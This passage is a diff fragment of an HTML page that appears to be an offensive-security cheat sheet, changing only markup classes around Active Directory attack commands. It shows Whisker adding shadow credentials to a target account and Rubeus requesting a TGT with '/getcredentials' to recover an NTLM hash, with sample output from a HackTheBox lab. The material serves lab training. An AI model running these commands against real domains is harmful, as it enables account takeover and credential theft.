/password:'<span class="o editable-keyword">&lt;PFX_PASSWORD&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\whisker.exe add /domain:outdated.htb /target:'sflowers' /dc:10.10.11.175 /password:'Test1234'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] No path was provided. The certificate will be printed as a Base64 blob
@@ -383,7 +254,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz ... [SNIP]... TvhwICB9A= /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
 </span></span></span></div></pre></div><h4 id="2-request-tgt-using-pfx-file-and-get-ntlm-hash">2. Request TGT using PFX file and get NTLM hash</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:'<span class="o">&lt;TARGET_USER&gt;</span>' /certificate:'<span class="o">&lt;BASE64_PFX&gt;</span>' /password:'<span class="o">&lt;PFX_PASSWORD&gt;</span>' /domain:<span class="o">&lt;DOMAIN&gt;</span> /dc:<span class="o">&lt;DC&gt;</span> /getcredentials /show
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:'<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' /certificate:'<span class="o editable-keyword">&lt;BASE64_PFX&gt;</span>' /password:'<span class="o editable-keyword">&lt;PFX_PASSWORD&gt;</span>' /domain:<span class="o editable-keyword">&lt;DOMAIN&gt;</span> /dc:<span class="o editable-keyword">&lt;DC&gt;</span> /getcredentials /show
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz ... [SNIP]... TvhwICB9A=' /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
